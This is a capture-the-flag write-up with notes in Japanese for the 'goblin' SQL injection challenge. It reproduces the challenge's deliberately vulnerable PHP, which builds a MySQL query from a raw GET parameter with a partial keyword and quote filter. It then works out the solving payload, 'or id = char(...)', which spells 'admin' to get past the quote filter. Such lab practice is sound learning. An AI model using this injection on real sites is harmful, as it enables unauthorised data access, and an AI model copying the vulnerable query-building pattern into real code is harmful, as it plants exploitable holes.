# goblin

## answer

```
https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=2 or id = char(97,100,109,105,110)
```

## problem

```
query : select id from prob_goblin where id='guest' and no=

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

## memo

```?no=aaa```とかで試してみる。

```query : select id from prob_goblin where id='guest' and no=aaa```となった。まあそうか。


コードを読んでいく。

「prob」or「_」or「\.」or「\(\)」、「\\」、「"」、「`」これらが正規表現にマッチしたら、exit。

動きとしては、id=guestかつno='活用'のときのselectで値が引っかかったときにquery resultに何かしらの値が入る。

```if($result['id'] == 'admin') solve("goblin");```

とあるので、ログインが成功したあとでもDBから返ってきたidがadminになったときに問題が解ける。

'がフィルターされているときは"で置き換えるのがセオリーらしいが、"もフィルターされているのでどうしようかと悩む。

そこで、adminという文字列のASCII値をchar()関数で戻しながらexploitに注入する方向で考えてみる。

adminのASCII値を調べて条件に組み込む。

```
select id from prob_goblin where id='guest' and no=aaa or id='admin'
```

このクエリを完成形で目指してエクスプロイトを考えたい。

```
https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=2 or id = char(97,100,109,105,110)
```

できた。


## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)

- [BSides Delhi CTF 2018 Write up | こんとろーるしーこんとろーるぶい](https://graneed.hatenablog.com/entry/2018/10/26/232304)

- [ASCIIコード表 | TOMOJI blog](http://www9.plala.or.jp/sgwr-t/c_sub/ascii.html)

- [char and varchar type | my sql manual](https://dev.mysql.com/doc/refman/5.6/ja/char.html)